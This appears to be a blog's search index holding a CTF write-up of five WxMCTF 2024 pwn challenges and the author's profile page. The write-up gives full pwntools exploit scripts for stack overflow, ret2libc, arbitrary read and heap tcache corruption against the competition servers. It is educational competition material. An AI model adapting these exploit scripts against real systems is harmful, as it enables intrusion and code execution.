[{"categories":["CTF"],"content":" WxMCTF 2024 Scoreboard I participated in WxMCTF 2024 as part of the Megaricano team. And our team took second place. The Megaricano team is made up of Raon Secure Core Research Team members. Pwn ","date":"2024-04-07","objectID":"/wxmctf_2024/:0:0","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Moodle Madness Challenge Description It recently came to light from an anonymous source that “Moodle,” the math assignment program made famous by Ms. Gugoiu, has an exploit to see the answers to questions. Buddhathe18th, always reluctant to do homework, decided to investigate this exploit himself for the notorious 3.2 STACK Part 2 Challenge. He vaguely recalls that it involves inputting a string into the answer box, but with 1 hour left, he needs some help. Could you help him find the exploit? ","date":"2024-04-07","objectID":"/wxmctf_2024/:1:0","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Analysis There is no server information. Just one binary. At first, I read the problem description and thought it was supposed to provide an exploit method related to the binary. But this was a bad idea and I wasted some time because of it. int __cdecl main(int argc, const char **argv, const char **envp) { __int64 buf[126]; // [rsp+40h] [rbp-3F0h] BYREF buf[125] = __readfsqword(0x28u); puts( \"The graph of the polynomial function f(x) = -2x^4-16x^3-49x^2-68x-33 is symmetric with respect to a vertical line. F\" \"ind the equation of this vertical line:\\n\" \"x= \"); memset(buf, 0, 1000); read(0, buf, 0x3E8uLL); printf((const char *)buf); // Format String Bug if ( !strcmp((const char *)buf, \"3\\n\") ) printf(\"\\nCorrect!\"); else printf(\"\\nIncorrect!\"); return 0; } ","date":"2024-04-07","objectID":"/wxmctf_2024/:1:1","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Solve If you open the binary with IDA, you can immediately find a format string bug, which made me confused. But this challenge is baby baby baby challenge, so if you open the binary through gdb and run it for a bit, you can see the flags stored upside down in the stack by 4 bytes. pwndbg\u003e stack 50 00:0000│ rsp 0x7fffffffdeb0 ◂— 'cmxw m{ft ld00 4m_3 r3t5 dn1m }!!! ' 01:0008│-428 0x7fffffffdeb8 ◂— 'm{ft ld00 4m_3 r3t5 dn1m }!!! ' 02:0010│-420 0x7fffffffdec0 ◂— 'ld00 4m_3 r3t5 dn1m }!!! ' 03:0018│-418 0x7fffffffdec8 ◂— '4m_3 r3t5 dn1m }!!! ' 04:0020│-410 0x7fffffffded0 ◂— 'r3t5 dn1m }!!! ' 05:0028│-408 0x7fffffffded8 ◂— 'dn1m }!!! ' 06:0030│-400 0x7fffffffdee0 ◂— '}!!! ' flag wxmctf{m00dl3_m45t3rm1nd!!!} ","date":"2024-04-07","objectID":"/wxmctf_2024/:1:2","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"TEJ3M Description Here’s my TEJ3M assignment! We’re learning how to use C, and I think it’s pretty easy! My teacher tells us gets is unsafe, but I think he doesn’t know how to error trap! ","date":"2024-04-07","objectID":"/wxmctf_2024/:2:0","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Analysis This challenge give source code, so easy to analysis. #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e void win(){ system(\"cat flag.txt\"); } void func(){ char buf[040]; while(1) { puts(\"Enter your info: \\n\"); gets(buf); if(strlen(buf) \u003c 31) { puts(\"Thank you for valid data!!!\\n\"); break; } puts(\"My teacher says that's unsafe!\\n\"); } } void main() { setvbuf(stdin, NULL, 2, 0); setvbuf(stdout, NULL, 2, 0); func(); } Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) As you can see, it is a 32-bit binary with no stack canary or PIE, and a stack overflow occurs through the gets function. And thankfully the win function exists. EZPZ ","date":"2024-04-07","objectID":"/wxmctf_2024/:2:1","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Exploit from pwn import * #p = process(\"./assgn1_2o3BvZ6\") p = remote(\"f61841b.678470.xyz\", 30717) e = ELF(\"./assgn1_2o3BvZ6\") p.sendline(b\"a\" * 44 + p32(e.sym.win)) p.interactive() flag wxmctf{1_th1nk_1_f41led...} ","date":"2024-04-07","objectID":"/wxmctf_2024/:2:2","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Nah id win Description As the strongest problem in history faced off against the strongest pwner of today, they asked it: “Are you the shell because you are /bin/sh? Or are you /bin/sh because you are the shell?” The pwner laughed. “Stand proud. You are strong.” said the pwner. At this moment, the pwner used their domain expansion. “DOMAIN EXPANSION. ret2libc.” The problem began using reverse pwn technique, but it wasn’t enough. The domain was simply too strong. However, the problem had not yet used its domain expansion. “DOMAIN EXPANSION: Return restrictions.” The problem said, and the domain was instantly shattered. “Nah, I’d win.” The problem said, and the pwner was dealt with. ","date":"2024-04-07","objectID":"/wxmctf_2024/:3:0","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Analysis If you read the description, you can see that the author is a fan of Jujutsu Kaisen. lol “DOMAIN EXPANSION. ret2libc.” This challenge give source code, binary and libc. #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int vuln() { char buf[0x20]; printf(\"My cursed technique is revealing libc... %p\\n\",printf); gets(buf); if(__builtin_return_address(0) \u003c 0x90000000) { return 0; } printf(\"NAH I'D WIN!\\n\"); exit(0); } int main() { setvbuf(stdin, NULL, 2, 0); setvbuf(stdout, NULL, 2, 0); vuln(); return 0; } Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) This is another vulnerable 32-bit binary. There is no win function, but you can see from the description that you can use the ret2libc technique. In vuln function, we can get libc leak. So, just do ret2libc. ","date":"2024-04-07","objectID":"/wxmctf_2024/:3:1","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Exploit from pwn import * #p = process(\"./vuln\", env={\"LD_PRELOAD\":\"./libc.so.6\"}) p = remote(\"7d9d14b.678470.xyz\", 31709) e = ELF(\"./vuln\") libc = ELF(\"./libc.so.6\") context.terminal = ['tmux', 'splitw', '-h'] p.recvuntil(b\"My cursed technique is revealing libc... \") libc_leak = int(p.recvline().strip(), 16) - 0x57a90 log.info(\"libc base: \" + hex(libc_leak)) system = libc_leak + libc.sym.system binsh = libc_leak + next(libc.search(b\"/bin/sh\")) #gdb.attach(p) p.sendline(b\"a\" * 44 + p32(0x0804900e) + p32(system) + p32(binsh) + p32(binsh)) p.interactive() flag wxmctf{d0main_expansion:ret2libc.} ","date":"2024-04-07","objectID":"/wxmctf_2024/:3:2","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"leakleakleak Description Leak, leak, leak, leak, I want you in my leak! ","date":"2024-04-07","objectID":"/wxmctf_2024/:4:0","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Analysis This challenge give source code, binary and Dockerfile. // compile with: gcc leakleakleak.c -o leakleakleak -fpie -pie #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e #include \u003cstring.h\u003e #include \u003cfcntl.h\u003e char flag[128] = {0}; typedef struct { char username[32]; char *description; } User; void warmup_heap(void) { void *addrs[3]; for (size_t i = 0; i \u003c 3; ++i) { addrs[i] = malloc(9000); } free(addrs[1]); } User *create_user(void) { User *user = calloc(1, sizeof (User)); user-\u003edescription = calloc(1, 256); return user; } void destroy_user(User *user) { free(user-\u003edescription); free(user); } void init(void) { setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); } void read_flag(void) { int flag_fd = open(\"./flag.txt\", O_RDONLY); off_t flag_size = lseek(flag_fd, 0, SEEK_END); lseek(flag_fd, 0, SEEK_SET); read(flag_fd, flag, flag_size); flag[flag_size] = '\\00'; close(flag_fd); } int main() { init(); read_flag(); warmup_heap(); User *user = create_user(); for (_Bool quit = 0; !quit; ) { printf(\"What is your name? \"); read(STDIN_FILENO, user, sizeof(*user)); printf(\"Hello %s!\\n\", user-\u003eusername); puts(\"Let me tell you something about yourself! :3\"); printf(\"%s\\n\", user-\u003edescription); printf(\"Continue? (Y/n) \"); char c = getchar(); if (c == 'n' || c == 'N') quit = 1; } puts(\"Boom! Boom, boom, boom! I want YOU in my room!\"); destroy_user(user); return 0; } Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled First 64-bit Binary with Partial RELRO!! The vulnerability is that in read(STDIN_FILENO, user, sizeof(*user));, the description member in User structure, which is char*, can be manipulated by receiving input equal to the size of the User structure. We can use AAR with printf(\"%s\\n\", user-\u003edescription);. ","date":"2024-04-07","objectID":"/wxmctf_2024/:4:1","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Exploit We have AAR. So I use AAR to leak heap -\u003e leak libc -\u003e leak environ -\u003e leak flag. from pwn import * p = process(\"./leakleakleak\") libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") context.terminal = ['tmux', 'splitw', '-h'] context.log_level = 'debug' # p = remote(\"32cb2f5.678470.xyz\", 32411) pay = b\"a\" * 33 p.sendafter(b\"?\", pay) p.recvuntil(pay) res = (u64(p.recvn(5).ljust(8, b\"\\x00\")) \u003c\u003c 8) print(hex(res)) p.sendlineafter(b\"?\", b\"Y\") pay = b\"a\" * 32 + p64(res+ 0x118) p.sendafter(b\"?\", pay) p.recvuntil(b\":3\\n\") res = u64(p.recvn(6).ljust(8, b\"\\x00\")) print(hex(res)) pay = b\"a\" * 32 + p64(res+ 0x6e80) p.sendafter(b\"?\", pay) p.recvuntil(b\":3\\n\") res = u64(p.recvn(6).ljust(8, b\"\\x00\")) print(\"environ\" + hex(res)) p.sendlineafter(b\"?\", b\"Y\") pay = b\"a\" * 32 + p64(res-0x30) p.sendafter(b\"?\", pay) p.recvuntil(b\":3\\n\") res = u64(p.recvn(6).ljust(8, b\"\\x00\")) print(hex(res)) #gdb.attach(p) pay = b\"a\" * 32 + p64(res+ 0x2fab) p.sendafter(b\"?\", pay) p.interactive() flag wxmctf{woooOoOoO0O0O00_just_M3_4nd_Y0U_tog3th3r_in_MY_r00m_x3c} ","date":"2024-04-07","objectID":"/wxmctf_2024/:4:2","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"lain_writes_in_lisp Description Have you read your SICP today? HINT: After you get the leaks there’s an almost arbitrarily long overflow on the heap in the “add_token” function. Use it to corrupt the heap’s metadata. I First-Blooded this Challenge!! ","date":"2024-04-07","objectID":"/wxmctf_2024/:5:0","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Analysis This challenge give source code, binary and Dockerfile. #include \u003cctype.h\u003e #include \u003cstdint.h\u003e #include \u003cstdio.h\u003e #include \u003cstring.h\u003e #include \u003cstdlib.h\u003e #include \u003cstdbool.h\u003e #include \u003cunistd.h\u003e #define MAX_TOKEN_SIZE 1024 #define next(token) (*(token) = (*(token))-\u003enext) typedef struct token { char *str; struct token *next; } Token; typedef enum { none, number, string, function } Type; typedef struct number { int64_t value; } Number; typedef struct string { char *str_ptr; size_t str_len; } String; typedef struct function { char *function_name; } Function; typedef struct node { Type type; struct node *child_nodes; struct node *next; union { Number number; String string; Function func; } value; } Node; _Bool panic = false; void boot_os(void); void add_token(const char *token_str, size_t token_len, Token **beg, Token **end); void destroy_tokens(Token *token); Token *tokenize(const char *s, size_t len); Node *create_node(void); void destroy_nodes(Node *node); _Bool is_number(const char *s); char *get_string_literal(char *s, size_t *ret_len); char *get_function_by_name(char *s); Node *parse_token(Token **token); Node *parse_expr(Token **token); Node *eval_function(Node *node); Node *eval(Node *node); Node *plus_fnc(Node *args); Node *mul_fnc(Node *args); Node *none_fnc(Node *args); void print_node(Node *args); int main(); void boot_os(void) { setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); } void add_token(const char *token_str, size_t token_len, Token **beg, Token **end) { Token *new_token = calloc(1, sizeof (Token)); if (new_token == NULL) { fprintf(stderr, \"I just don't know what went wrong...\\n\"); exit(-1); } new_token-\u003enext = NULL; new_token-\u003estr = calloc(1, strlen(token_str) + 1); if (new_token-\u003estr == NULL) { fprintf(stderr, \"I just don't know what went wrong...\\n\"); exit(-1); } memcpy(new_token-\u003estr, token_str, token_len); if (*beg == NULL) { *beg = new_token; *end = new_token; } else { (*end)-\u003enext = new_token; *end = new_token; } } void destroy_tokens(Token *token) { if (token == NULL) return; destroy_tokens(token-\u003enext); free(token-\u003estr); free(token); } Token *tokenize(const char *s, size_t len) { char token_str[MAX_TOKEN_SIZE + 1]; size_t token_length = 0; Token *beg = NULL; Token *end = NULL; _Bool inside_string = false; for (size_t i = 0; i \u003c len; ++i) { char c = s[i]; if ((c == ' ' || c == '\\n' || c == '(' || c == ')') \u0026\u0026 !inside_string) { if (token_length != 0) { token_str[token_length] = '\\0'; add_token(token_str, token_length, \u0026beg, \u0026end); token_length = 0; } if (c == '(') { add_token(\"(\", 1, \u0026beg, \u0026end); } else if (c == ')') { add_token(\")\", 1, \u0026beg, \u0026end); } } else if (token_length \u003c= MAX_TOKEN_SIZE) { token_str[token_length++] = c; } else { panic = true; fprintf(stderr, \"Token too long! Aborting...\\n\"); return beg; } if (c == '\"') { if (inside_string) { token_str[token_length] = '\\0'; add_token(token_str, token_length, \u0026beg, \u0026end); token_length = 0; } inside_string = !inside_string; } } return beg; } Node *create_node(void) { Node *node = malloc(sizeof (Node)); if (node == NULL) { fprintf(stderr, \"I just don't know what went wrong...\\n\"); exit(-1); } node-\u003echild_nodes = NULL; node-\u003enext = NULL; node-\u003etype = none; return node; } void destroy_nodes(Node *node) { if (node == NULL) return; if (node-\u003echild_nodes != NULL) destroy_nodes(node-\u003echild_nodes); if (node-\u003enext != NULL) destroy_nodes(node-\u003enext); if (node-\u003etype == string) free(node-\u003evalue.string.str_ptr); free(node); } _Bool is_number(const char *s) { while (*s) if (!isdigit(*s++)) return false; return true; } char *get_string_literal(char *s, size_t *ret_len) { if (s == NULL) return NULL; if (*s != '\"') return NULL; size_t len = 1; while (s[len] != '\"') ++len; char *new_s = calloc(1, len+1); memcpy(new_s, s+1, len-1); new_s[len] = '\\0'; *ret_len = len-1; return new_s; } char *get_function_by_name(char *s) { if (strcmp(s, \"+\") == 0) { return \"+\"; } else if (strcmp(s, \"*\") == 0) { return \"*\"; } else { return NULL; } } Node *parse","date":"2024-04-07","objectID":"/wxmctf_2024/:5:1","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Exploit from pwn import * #p = process(\"./lain\") p = remote(\"50790b2.678470.xyz\", 31454) e = ELF(\"./lain\") context.terminal = ['tmux', 'splitw', '-h'] context.log_level = 'debug' def leak(addr): p.sendlineafter(b\"\u003c\u003c\u003c\", \"(+ \\\"\\\" \" + str(addr) + \")\") a = \"a\" * 0x98 p.sendlineafter(b\"\u003c\u003c\u003c\", f\"(+ 0 \\\"a\\\")\") res = int(p.recvline().strip(), 10) print(hex(res)) p.sendlineafter(b\"\u003c\u003c\u003c\", f\"(+ \\\"{a}\\\" \\\"{a}\\\")\") p.sendlineafter(b\"\u003c\u003c\u003c\", f\"(+ \\\"{a}\\\" \\\"{a}\\\")\") p.sendlineafter(b\"\u003c\u003c\u003c\", f\"(+ \\\"\\\" \\\"aaaaaaaa\\\")\") key = res \u003e\u003e 12 print(key) off = res + 0x698 leak(off) p.recvn(1) libc_base = u64(p.recvn(6).ljust(8, b\"\\x00\")) - 0x21ace0 og = libc_base + 0xebd38 print(hex(og)) # gdb.attach(p) p.sendlineafter(b\"\u003c\u003c\u003c\", b\"(+ \" + p64(0) *2 + b\" \" + p64(0x411) *4 + p64((libc_base+0x21a000) ^ key) + b\")\") b = b\"a\" * 0x98 + p64(og)[:6] p.sendlineafter(b\"\u003c\u003c\u003c\", f\"(+ \\\"\".encode() + b + f\"\\\" \\\"\".encode() + b + f\"\\\" \\\"{a}\\\" \\\"{a}\\\" \\\"{a}\\\" \\\"{a}\\\" \\\"{a}\\\")\".encode()) p.interactive() To exploit the binary, I leaked the heap address and then leaked the address of libc remaining in the heap. After that, I was able to exploit the binary by using the overflow vulnerability to manipulate the tcache of size 0xa0 and overwrite libc got with one_gadget. flag wxmctf{(did (you (know (?))))(lisp (is (the (most (powerful (language))))))!!} author writup link ","date":"2024-04-07","objectID":"/wxmctf_2024/:5:2","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":null,"content":"Intro Sungmin Kim (a.k.a kimg00n) Raon Secure Core Research Team Konyang Univ, Cyber Security undergraduate Interested in Pwnable In SaturnX Team(CTF Player) Skills System Hacking, Reversing C Node.js Docker Solidity etc… Experiences 2019.12 ~ 2021.7 Republic of Korea Air Force Information Security Soldier 2021.7 ~ 2021.12 Big data analysis and security expert training in Pyeongtaek city ELK Logging Project 2022.3 ~ 2022.9 Konyang University 5th K-CTF PL Guidance on problem solving in making challenges 2022.7 ~ 2023.3 KITRI Best of the Best(BoB) 11th vulnerability analysis Track 2022.8 ~ 2022.12 UEFI Exploitation Fuzzer project in BoB MCD Team Our Project Gitbook UEFI Security Paper CISC-W'22 Poster session accepted CVE-2023-27471(SA-2023036) SVE-2023-0437(CVE-2023-30738) 2023.3 ~ 2023.12 Chairman of Impes, a cyber security club at Konyang University 2024.2 ~ now Core Research Team in Raon Secure 🚩CTFs 2023.01 Iris CTF 2023 22th place in APT0 2023.03 Wolv CTF 2023 6th place in SaturnX 2023.05 DEFCON31 Qual 17th place in untitled 2023.08 ESCAPE CTF 2023 Pre 6th place in 한입보이 2023.08 Samsung Security Tech Forum CTF 6th place in SaturnX 2024.02 ESCAPE CTF 2023 Final 4th place in SaturnX 2024.03 WxMCTF 2024 2th place in Megaricano 2024.03 VolgaCTF 2024 Qualifier 6th place in SaturnX etc… 🏆 Awards 2020.11 Konyang University 3rd K-CTF 2nd Prize 2023.09 Cyber Security Conference at HONAM 웹 취약점 경진대회 3rd Prize ","date":"2024-04-07","objectID":"/about/:0:0","tags":null,"title":"About Me","uri":"/about/"}]